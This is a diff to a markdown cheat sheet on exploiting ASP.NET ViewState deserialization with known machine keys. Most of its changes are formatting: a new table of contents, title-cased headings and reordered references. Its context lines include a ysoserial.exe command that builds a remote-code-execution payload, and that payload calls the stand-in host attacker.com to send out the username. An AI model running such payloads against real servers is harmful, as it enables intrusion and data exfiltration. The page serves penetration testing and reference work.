@@ -2,6 +2,20 @@
 
 > That machine key is used for encryption and decryption of forms authentication cookie data and view-state data, and for verification of out-of-process session state identification.
 
+## Summary
+
+* [Viewstate Format](#viewstate-format)
+* [Machine Key Format And Locations](#machine-key-format-and-locations)
+* [Identify Known Machine Key](#identify-known-machine-key)
+* [Decode ViewState](#decode-viewstate)
+* [Generate ViewState For RCE](#generate-viewstate-for-rce)
+    * [MAC Is Not Enabled](#mac-is-not-enabled)
+    * [MAC Is Enabled And Encryption Is Disabled](#mac-is-enabled-and-encryption-is-disabled)
+    * [MAC Is Enabled And Encryption Is Enabled](#mac-is-enabled-and-encryption-is-enabled)
+* [Edit Cookies With The Machine Key](#edit-cookies-with-the-machine-key)
+* [References](#references)
+
+
 **Requirements**
 
 * `__VIEWSTATE`
@@ -22,7 +36,7 @@ By default until Sept 2014, the `enableViewStateMac` property was to set to `Fal
 Usually unencrypted viewstate are starting with the string `/wEP`.
 
 
-## Machine Key Format and Locations
+## Machine Key Format And Locations
 
 A machineKey in IIS is a configuration element in ASP.NET that specifies cryptographic keys and algorithms used for encrypting and validating data, such as view state and forms authentication tokens. It ensures consistency and security across web applications, especially in web farm environments. 
 
@@ -59,7 +73,7 @@ Common locations of **web.config** / **machine.config**
     * `HKEY_CURRENT_USER\Software\Microsoft\ASP.NET\2.0.50727.0\AutoGenKey`
 
 
-## Identify known machine key
+## Identify Known Machine Key
 
 Try multiple machine keys from known products, Microsoft documentation, or other part of the Internet.
 
@@ -117,18 +131,18 @@ List of interesting machine keys to use:
     ```
 
 
-## Generate ViewState for RCE
+## Generate ViewState For RCE
 
 First you need to decode the Viewstate to know if the MAC and the encryption are enabled. 
 
-### MAC is not enabled
+### MAC Is Not Enabled
 
 ```ps1
 ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/:UserName"
 ```
 
 
-### MAC is enabled and Encryption is disabled
+### MAC Is Enabled And Encryption Is Disabled
 
 * Find the machine key (validationkey) using `badsecrets`, `viewstalker`, `AspDotNetWrapper.exe` or `viewgen` 
     ```ps1
@@ -147,7 +161,7 @@ ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "power
     ```
 
 
-### MAC is enabled and Encryption is enabled
+### MAC Is Enabled And Encryption Is Enabled
 
 Default validation algorithm is `HMACSHA256` and the default decryption algorithm is `AES`.
 
@@ -164,7 +178,7 @@ If the `__VIEWSTATEGENERATOR` is missing but the application uses .NET Framework
     ```
 
 
-## Edit cookies with the machine key
+## Edit Cookies With The Machine Key
 
 If you have the `machineKey` but the viewstate is disabled.
 
@@ -181,8 +195,8 @@ $ AspDotNetWrapper.exe --decryptDataFilePath C:\DecryptedText.txt
 
 ## References
 
+* [Deep Dive into .NET ViewState Deserialization and Its Exploitation - Swapneil Kumar Dash - October 22, 2019](https://swapneildash.medium.com/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817)
 * [Exploiting Deserialisation in ASP.NET via ViewState - Soroush Dalili - April 23, 2019](https://soroush.me/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)
-* [Exploiting ViewState Deserialization using Blacklist3r and YSoSerial.Net - claranet - 13/06/2019](https://www.claranet.com/us/blog/2019-06-13-exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserialnet)
-* [View State, The unpatchable IIS forever day being actively exploited - zeroed.tech - 21-7-2024](https://zeroed.tech/blog/viewstate-the-unpatchable-iis-forever-day-being-actively-exploited/)
-* [Project Blacklist3r - November 23, 2018 - @notsosecure](https://www.notsosecure.com/project-blacklist3r/)
-* [Deep Dive into .NET ViewState deserialization and its exploitation - Swapneil Kumar Dash - Oct 22, 2019](https://swapneildash.medium.com/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817)
+* [Exploiting ViewState Deserialization using Blacklist3r and YSoSerial.Net - Claranet - June 13, 2019](https://www.claranet.com/us/blog/2019-06-13-exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserialnet)
+* [Project Blacklist3r - @notsosecure - November 23, 2018](https://www.notsosecure.com/project-blacklist3r/)
+* [View State, The Unpatchable IIS Forever Day Being Actively Exploited - Zeroed - July 21, 2024](https://zeroed.tech/blog/viewstate-the-unpatchable-iis-forever-day-being-actively-exploited/)
